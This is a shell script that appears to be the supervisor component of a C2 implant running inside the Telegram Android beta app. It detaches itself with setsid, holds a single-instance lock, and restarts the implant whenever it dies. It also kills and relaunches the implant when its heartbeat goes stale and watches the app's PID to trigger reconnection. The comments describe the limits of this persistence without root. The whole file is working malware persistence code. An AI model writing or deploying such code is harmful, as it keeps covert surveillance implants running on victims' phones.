#!/system/bin/sh
# telegramandroidwidget/c2/implant/supervisor.sh
#
# Watchdog for implant.sh.  Runs in its own session (started by the bootstrap
# with setsid) and restarts the implant if it dies or wedges.
#
# What it can and cannot do:
#   * survives an app crash (same UID, different session)          -> restart
#   * notices the app PID change and asks the implant to re-hello  -> reconnect
#   * does NOT survive `am force-stop` on Android 13: the framework
#     kills the entire UID/cgroup, supervisor included.  There is no
#     non-root workaround on a single app UID.
#
# Environment:
#   C2_DIR    directory holding implant.sh (required, set by bootstrap)
#   C2_MOCK   1 for the host mock
#   C2_SH     shell to use (default /system/bin/sh, fallback sh)
#   C2_STALE  seconds without heartbeat before a kill (default 120)

APP="org.telegram.messenger.beta"
MOCK="${C2_MOCK:-0}"
D="${C2_DIR:-}"
[ -n "$D" ] || { echo "supervisor: C2_DIR missing" >&2; exit 2; }
SH="${C2_SH:-/system/bin/sh}"
[ -x "$SH" ] || SH="sh"
SETSID="${C2_SETSID:-/system/bin/setsid}"
[ -x "$SETSID" ] || SETSID="setsid"
SLEEP="${C2_SLEEP:-/system/bin/sleep}"
[ -x "$SLEEP" ] || SLEEP="sleep"
STALE="${C2_STALE:-120}"

LOG="$D/sup.log"
PIDF="$D/implant.pid"
STOP="$D/stop"
RESTART="$D/restart"
HB="$D/hb"
LOCK="$D/sup.lock"

log() { printf '%s %s\n' "$(date '+%F %T' 2>/dev/null)" "$*" >> "$LOG" 2>/dev/null; }
now() { date +%s 2>/dev/null || echo 0; }

mkdir -p "$D" 2>/dev/null
if [ ! -f "$D/implant.sh" ]; then
    log "MISSING implant.sh in $D"
    exit 1
fi

# one supervisor per state directory
if ! mkdir "$LOCK" 2>/dev/null; then
    old=$(cat "$LOCK/pid" 2>/dev/null)
    if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
        log "SUP_ALREADY_RUNNING pid=$old"
        exit 0
    fi
    rm -rf "$LOCK" 2>/dev/null
    mkdir "$LOCK" 2>/dev/null || exit 1
fi
printf '%s\n' "$$" > "$LOCK/pid"
printf '%s\n' "$$" > "$D/sup.pid"

cleanup() {
    log "STOP"
    rm -rf "$LOCK" 2>/dev/null
    exit 0
}
trap cleanup TERM INT HUP

alive() {
    p="$1"
    case "$p" in ''|*[!0-9]*) return 1 ;; esac
    kill -0 "$p" 2>/dev/null || return 1
    # guard against PID reuse after a reboot
    c=""
    if [ -r "/proc/$p/cmdline" ]; then
        c=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null)
    fi
    case "$c" in
        *implant.sh*) return 0 ;;
        "") return 0 ;;          # /proc not readable: trust kill -0
        *) return 1 ;;
    esac
}

start_implant() {
    [ -f "$STOP" ] && return 0
    # Do not write implant.pid here: the implant writes it only after winning
    # its single-instance lock, so a rejected duplicate cannot clobber the
    # live PID.  setsid still detaches the process from the supervisor.
    C2_DIR="$D" C2_MOCK="$MOCK" C2_SH="$SH" C2_BUILD="${C2_BUILD:-}" \
        "$SETSID" "$SH" -c 'exec "$C2_SH" "$C2_DIR/implant.sh"' \
        </dev/null >>"$D/implant.out" 2>&1 &
    log "IMPLANT_START"
}

log "START pid=$$ mock=$MOCK build=${C2_BUILD:-?} dir=$D"
BACKOFF=1
LAST_APP=""

while :; do
    if [ -f "$STOP" ]; then
        ip=$(cat "$PIDF" 2>/dev/null)
        if [ -n "$ip" ]; then kill "$ip" 2>/dev/null; fi
        rm -rf "$LOCK" 2>/dev/null
        log "STOP_FILE"
        exit 0
    fi

    if [ "$MOCK" = "1" ]; then
        app="${C2_MOCK_PID:-4242}"
    else
        app=$(pidof "$APP" 2>/dev/null | tr '\n' ' ')
        app="${app%% *}"
        case "$app" in *[!0-9]*) app="" ;; esac
    fi
    if [ -n "$app" ] && [ "$app" != "$LAST_APP" ] && [ -n "$LAST_APP" ]; then
        log "APP_RESTART old=$LAST_APP new=$app"
        printf '%s\n' "$app" > "$RESTART" 2>/dev/null
    fi
    [ -n "$app" ] && LAST_APP="$app"

    ip=$(cat "$PIDF" 2>/dev/null)
    if alive "$ip"; then
        hb=$(cat "$HB" 2>/dev/null)
        case "$hb" in ''|*[!0-9]*) hb=0 ;; esac
        age=$(( $(now) - hb ))
        if [ "$age" -gt "$STALE" ]; then
            log "STALE kid pid=$ip age=$age"
            kill -9 "$ip" 2>/dev/null
            rm -f "$PIDF" 2>/dev/null
            BACKOFF=1
        else
            BACKOFF=1
        fi
    else
        log "IMPLANT_DEAD backoff=$BACKOFF"
        start_implant
        "$SLEEP" "$BACKOFF"
        BACKOFF=$((BACKOFF * 2))
        [ "$BACKOFF" -gt 30 ] && BACKOFF=30
    fi

    "$SLEEP" 3
done
